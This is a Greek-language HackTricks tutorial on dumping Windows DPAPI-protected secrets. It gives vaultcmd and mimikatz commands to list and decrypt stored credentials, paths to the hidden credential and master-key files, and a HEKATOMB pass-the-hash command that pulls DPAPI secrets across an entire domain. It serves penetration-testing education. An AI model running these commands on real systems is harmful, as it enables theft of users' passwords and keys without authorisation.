# DPAPI - Εξαγωγή Κωδικών Πρόσβασης

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σημαντικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}


## Τι είναι το DPAPI

Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, εκμεταλλευόμενο είτε τα μυστικά του χρήστη είτε τα μυστικά του συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση του συστήματος, τα μυστικά ελέγχου τομέα του συστήματος, απαλλάσσοντας έτσι τους προγραμματιστές από την ανάγκη να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης.

### Δεδομένα που προστατεύονται από το DPAPI

Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI περιλαμβάνονται:

- Οι κωδικοί πρόσβασης του Internet Explorer και του Google Chrome και τα δεδομένα αυτόματης συμπλήρωσης
- Οι κωδικοί πρόσβασης για τα email και τους εσωτερικούς λογαριασμούς FTP για εφαρμογές όπως το Outlook και το Windows Mail
- Οι κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- Οι κωδικοί πρόσβασης για συνδέσεις απομακρυσμένης επιφάνειας εργασίας, το .NET Passport και τα ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και πιστοποίησης
- Οι κωδικοί πρόσβασης δικτύου που διαχειρίζεται ο Διαχειριστής Πιστοποιητικών και τα προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν τη CryptProtectData, όπως το Skype, το MSN Messenger και άλλα


## Λίστα Θησαυροφυλακίου
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Αρχεία διαπιστευτηρίων

Τα **αρχεία διαπιστευτηρίων που προστατεύονται** μπορεί να βρίσκονται στις εξής τοποθεσίες:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Αποκτήστε πληροφορίες διαπιστευτήριων χρησιμοποιώντας το mimikatz `dpapi::cred`, στην απόκριση μπορείτε να βρείτε ενδιαφέρουσες πληροφορίες, όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Κλειδιά Master

Τα κλειδιά DPAPI που χρησιμοποιούνται για την κρυπτογράφηση των RSA κλειδιών του χρήστη αποθηκεύονται στον φάκελο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το {SID} είναι το [**Αναγνωριστικό Ασφαλείας**](https://en.wikipedia.org/wiki/Security\_Identifier) **του συγκεκριμένου χρήστη**. **Το κλειδί DPAPI αποθηκεύεται στον ίδιο αρχείο με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη**. Συνήθως είναι 64 bytes τυχαίων δεδομένων. (Παρατηρήστε ότι αυτός ο φάκελος είναι προστατευμένος, οπότε δεν μπορείτε να τον εμφανίσετε χρησιμοποιώντας την εντολή `dir` από το cmd, αλλά μπορείτε να τον εμφανίσετε από το PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Αυτό είναι πώς θα φαίνονται μια σειρά από Master Keys ενός χρήστη:

![](<../../.gitbook/assets/image (324).png>)

Συνήθως, **κάθε Master Key είναι ένα κρυπτογραφημένο συμμετρικό κλειδί που μπορεί να αποκρυπτογραφήσει άλλο περιεχόμενο**. Επομένως, είναι ενδιαφέρον να **εξάγουμε** το **κρυπτογραφημένο Master Key** για να το **αποκρυπτογραφήσουμε** αργότερα το **άλλο περιεχόμενο** που έχει κρυπτογραφηθεί με αυτό.

### Εξαγωγή Master Key & αποκρυπτογράφηση

Ελέγξτε την ανάρτηση [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) για ένα παράδειγμα πώς να εξάγετε το master key και να το αποκρυπτογραφήσετε.

## SharpDPAPI

Το [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) είναι μια μεταφορά της λειτουργικότητας του DPAPI από το έργο Mimikatz του [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

Το [**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του κλειδιού αντιγράφου ασφαλείας του ελεγκτή του τομέα μέσω του RPC. Στη συνέχεια, το σενάριο θα επιλύσει τη διεύθυνση IP όλων των υπολογιστών και θα εκτελέσει ένα smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το κλειδί αντιγράφου ασφαλείας του τομέα.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών που εξάγονται από τον κατάλογο LDAP, μπορείτε να βρείτε κάθε υποδίκτυο ακόμα κι αν δεν τα γνωρίζατε!

"Επειδή οι δικαιώματα του Domain Admin δεν είναι αρκετά. Χακάρετε τους όλους."

## DonPAPI

Το [**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να αποκτήσει αυτόματα μυστικά που προστατεύονται από το DPAPI.

## Αναφορές

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
